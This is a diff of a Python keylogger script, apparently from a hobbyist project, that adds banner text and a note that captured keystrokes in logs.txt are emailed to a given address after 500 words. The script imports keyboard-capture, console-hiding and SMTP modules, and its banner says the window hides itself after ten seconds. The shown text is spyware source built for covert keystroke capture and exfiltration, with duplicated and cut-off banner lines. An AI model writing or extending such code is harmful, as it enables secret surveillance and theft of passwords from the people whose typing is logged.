@@ -2,7 +2,9 @@
 
 from pynput import keyboard
 import os, sys, win32gui, win32console, datetime, time, smtplib, base64
+
 	
+
 if os.path.exists("logs.txt") == False:
         file = open("logs.txt", "w")
         file.close()
@@ -11,15 +13,22 @@ print('''
     |----->         KEYCAPTURE KEYLOGGER\n                     
     |----->          MADE BY KULDIP <3                       
     |----->           IN PYTHON 3 \n                        
-    |----->Pretty! Simple and basic  keylogger for windows.\n
+
+    |----->Pretty! Simple and basic  keylogger for windows and Linux.\n
     |----->             Thanks to:-					
     |----->    Techwebspot for contribution in our script
+
+    |----->Pretty! Simple and basic  keylogger for windows and linux.\n
+    |----->             Thanks to:-					   
+
     |-----> YOUTUBE, THE LEGEND GOOGLE, ALL MY FRIENDS.	   
     |----->         sorry if i forgot someone.		       
     |----->    These helps to make this thing happen. ;)
 	
 	
 NOTE:- Logs.txt file will be saved in same directory where the script is.
+     And automatically sent to your given email address whe
+     500 words Have saved in Logs.txt
 				
 WINDOW IS HIDDING IN 10 SECONDS. TO END THE PROGRAM
 		    OPEN TASK MANAGER AND KILL
